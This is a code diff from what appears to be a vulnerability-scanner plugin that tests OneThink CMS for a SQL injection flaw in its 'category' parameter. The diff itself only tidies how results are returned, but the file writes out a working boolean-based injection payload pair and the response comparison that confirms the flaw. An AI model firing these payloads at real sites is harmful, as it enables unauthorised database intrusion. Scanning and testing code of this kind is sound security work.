@@ -28,7 +28,7 @@ class onethink_category_sqli_BaseVerify:
                 cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
         if len(reqlst[0]) != len(reqlst[1]) and r"分类不存在或被禁用" in reqlst[1]: 
             cprint("[+]存在onethink3.2.0 SQL注入漏洞...(高危)\tpayload: "+vulnurl, "red")
-            return True, vulnurl, "Onethink 参数category SQL注入", str(payload1[0]+"\n"+payload1[1]), str(payload1[0]+"\n"+payload1[1])
+            return True, vulnurl, "Onethink 参数category SQL注入", str(payload1),str(payload1)
 
         reqlst = []
         payload2 = [r"/index.php?c=article&a=index&category[0]==0+and+1=1%23between&category[1]=a", r"/index.php?c=article&a=index&category[0]==0+and+1=2%23between&category[1]=a"]
@@ -42,10 +42,9 @@ class onethink_category_sqli_BaseVerify:
                 cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
         if len(reqlst[0]) != len(reqlst[1]) and r"分类不存在或被禁用" in reqlst[1]: 
             cprint("[+]存在onethink3.2.3 SQL注入漏洞...(高危)\tpayload: "+vulnurl, "red")
-            return True, vulnurl, "Onethink 参数category SQL注入", str(payload2[0]+"\n"+payload2[1]), str(payload2[0]+"\n"+payload2[1])
+            return True, vulnurl, "Onethink 参数category SQL注入", str(payload2), str(payload2)
         else:
             cprint("[-]不存在onethink_category_sqli漏洞", "white", "on_grey")
-            return False, None, None, None, None
         return False, None, None, None, None
 
 
